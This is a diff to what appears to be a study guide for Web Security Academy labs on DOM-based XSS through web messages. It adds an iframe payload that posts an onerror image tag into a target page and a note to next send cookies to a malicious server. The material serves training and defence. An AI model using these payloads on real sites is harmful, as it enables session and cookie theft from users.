@@ -347,8 +347,14 @@ Try this one first in the Exploit Server to see if XSS works (string `http` appe
 
 >In the `source code` we ***identify*** the call using ```addEventListener``` and an element id ```ads``` being referenced.  
 
-![Source code web message ads](images/source-code-web-message-ads.png)  
+![Source code web message ads](images/source-code-web-message-ads.png)
 
+> The data within the message gets inserted in "ads" div. Try first the `<img>` one (the basic `<script>alert(1)</script>` does not work):
+
+```html
+<iframe src="https://0a2c008c03da3b0683a478c1004a00d1.web-security-academy.net/" onload="this.contentWindow.postMessage('<img src=1 onerror=print() />','*')">
+```
+> Once proved, try send cookies to malicious server.
 >The ```fetch``` function enclose the collaborator target inside **back ticks**, and when the iframe loads on the victim browser, the `postMessage()` method sends a web message to their home page.  
 
 ```html
